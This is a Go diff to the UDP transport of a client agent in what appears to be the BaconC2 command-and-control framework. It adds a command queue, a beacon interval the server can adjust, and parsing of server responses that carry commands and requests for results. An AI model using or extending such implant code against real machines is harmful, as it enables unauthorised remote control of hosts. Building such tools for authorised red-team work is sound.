@@ -8,21 +8,26 @@ import (
 	"time"
 
 	"github.com/RabbITCybErSeC/BaconC2/client/models"
+	"github.com/RabbITCybErSeC/BaconC2/client/queue"
 )
 
 type UDPTransport struct {
-	serverHost string
-	serverPort int
-	agentID    string
-	conn       *net.UDPConn
-	mu         sync.Mutex
+	serverHost     string
+	serverPort     int
+	agentID        string
+	conn           *net.UDPConn
+	commandQueue   queue.ICommandQueue
+	beaconInterval time.Duration
+	mu             sync.Mutex
 }
 
-func NewUDPTransport(host string, port int, agentID string) models.ITransportProtocol {
+func NewUDPTransport(host string, port int, agentID string, commandQueue queue.ICommandQueue) models.ITransportProtocol {
 	return &UDPTransport{
-		serverHost: host,
-		serverPort: port,
-		agentID:    agentID,
+		serverHost:     host,
+		serverPort:     port,
+		agentID:        agentID,
+		commandQueue:   commandQueue,
+		beaconInterval: 10 * time.Second,
 	}
 }
 
@@ -66,13 +71,18 @@ func (t *UDPTransport) Register(agent models.Agent) error {
 }
 
 func (t *UDPTransport) Beacon() (models.Command, error) {
+	cmd, _, err := t.BeaconWithResultRequest()
+	return cmd, err
+}
+
+func (t *UDPTransport) BeaconWithResultRequest() (models.Command, bool, error) {
 	t.mu.Lock()
 	defer t.mu.Unlock()
 
 	var emptyCmd models.Command
 
 	if t.conn == nil {
-		return emptyCmd, fmt.Errorf("UDP connection not initialized")
+		return emptyCmd, false, fmt.Errorf("UDP connection not initialized")
 	}
 
 	// Send beacon message
@@ -81,33 +91,55 @@ func (t *UDPTransport) Beacon() (models.Command, error) {
 	}{ID: t.agentID}
 	jsonData, err := json.Marshal(beacon)
 	if err != nil {
-		return emptyCmd, fmt.Errorf("failed to marshal beacon: %w", err)
+		return emptyCmd, false, fmt.Errorf("failed to marshal beacon: %w", err)
 	}
 
 	_, err = t.conn.Write(jsonData)
 	if err != nil {
-		return emptyCmd, fmt.Errorf("UDP beacon error: %w", err)
+		return emptyCmd, false, fmt.Errorf("UDP beacon error: %w", err)
 	}
 
+	// Set read deadline for response
 	t.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 	buffer := make([]byte, 4096)
 	n, _, err := t.conn.ReadFromUDP(buffer)
 	if err != nil {
 		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-			return emptyCmd, nil // Timeout means no command
+			return emptyCmd, false, nil // Timeout means no command
 		}
-		return emptyCmd, fmt.Errorf("UDP read error: %w", err)
+		return emptyCmd, false, fmt.Errorf("UDP read error: %w", err)
 	}
 
-	var cmd models.Command
-	if err := json.Unmarshal(buffer[:n], &cmd); err != nil {
-		return emptyCmd, fmt.Errorf("failed to unmarshal command: %w", err)
+	// Parse server response
+	var response struct {
+		Command        models.Command `json:"command"`
+		Status         string         `json:"status,omitempty"`
+		NextBeacon     int            `json:"nextBeacon,omitempty"`
+		RequestResults bool           `json:"requestResults"`
+	}
+	if err := json.Unmarshal(buffer[:n], &response); err != nil {
+		return emptyCmd, false, fmt.Errorf("failed to unmarshal response: %w", err)
 	}
 
-	return cmd, nil
+	// Update beacon interval if provided
+	if response.NextBeacon > 0 {
+		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
+	}
+
+	// If only "status" is returned (e.g., "acknowledged"), return empty command
+	if response.Command.ID == "" && response.Status == "acknowledged" {
+		return emptyCmd, response.RequestResults, nil
+	}
+
+	// Queue the command
+	if err := t.commandQueue.Add(response.Command); err != nil {
+		return emptyCmd, response.RequestResults, fmt.Errorf("failed to queue command: %w", err)
+	}
+
+	return response.Command, response.RequestResults, nil
 }
 
-func (t *UDPTransport) SendResult(agentID string, result models.Command) error {
+func (t *UDPTransport) SendResult(agentID string, result models.CommandResult) error {
 	t.mu.Lock()
 	defer t.mu.Unlock()
 
